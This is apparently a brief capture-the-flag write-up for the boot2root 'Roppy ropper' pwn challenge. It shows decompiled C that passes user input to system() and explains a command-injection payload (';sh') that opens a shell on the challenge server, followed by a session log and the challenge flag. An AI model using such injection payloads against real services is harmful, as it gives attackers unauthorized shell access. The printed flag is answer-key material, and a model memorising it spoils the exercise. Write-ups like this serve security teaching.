## Roppy ropper (467pt)

### Description

> I love ropes do you? 
>
> nc 35.238.225.156 1004 
>
> Author: TheBadGuy


### Attachment

[lsass](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/boot2root/pwn/lsass/lsass)

### Analysis

statically linked:

```bash
% ldd lsass 
	not a dynamic executable
```

run_command:

```c
int __cdecl run_command(char a1){
  char v2; // [esp+6h] [ebp-12h]
  snprintf(&v2, 7, "ls %s", a1);
  printf("Result: %s:\n", (unsigned int)&v2);
  return system(&v2);
}
```

we can append `sh` after `ls` with `;` to get a shell

payload: `ls ;sh`

### Solution

```bash
% nc 35.238.225.156 1004 
(list_me_like_crazy)
Is this lsass I dont understand :)
Give me your arguments:
;sh 
Result: ls ;sh:
flag.txt
lsass
cat flag.txt
b00t2root{R0p_cHa1nS_ar3_tH3_b3st}
```

> flag: b00t2root{R0p_cHa1nS_ar3_tH3_b3st}

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/boot2root/pwn/lsass) 


